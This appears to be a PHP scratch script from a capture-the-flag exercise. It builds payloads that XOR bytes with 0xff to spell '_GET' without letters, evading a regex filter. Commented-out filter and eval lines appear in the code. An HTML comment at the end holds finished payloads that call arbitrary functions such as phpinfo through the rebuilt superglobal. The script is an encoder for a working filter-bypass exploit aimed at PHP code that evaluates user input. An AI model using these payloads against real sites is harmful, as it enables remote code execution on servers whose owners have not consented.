<?php
$a=urldecode("%a0");
$b=urldecode("%a0%98%9a%8b");
$c=$a^$b;

var_dump( $c);
// eval("echo $a^$b;");
// if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $_) )
// $_=('%ff'^'a').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // 
// echo $_;
// echo urlencode("phpinfo");
$str="_GET";
// $str="_";
$strlen = strlen($str);
for ($i=0; $i < $strlen ; $i++) { 
    echo '%';
    echo base_convert(ord($str[$i]^urldecode("%ff")),10,16);
    // echo "\r\n";
}
// echo base_convert(ord('h'),10,16);
// eval($c());
?>

<!-- ${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&%ff=phpinfo
${%a0%98%9a%8b^%ff%ff%ff%ff}{%a0}();&%a0=phpinfo -->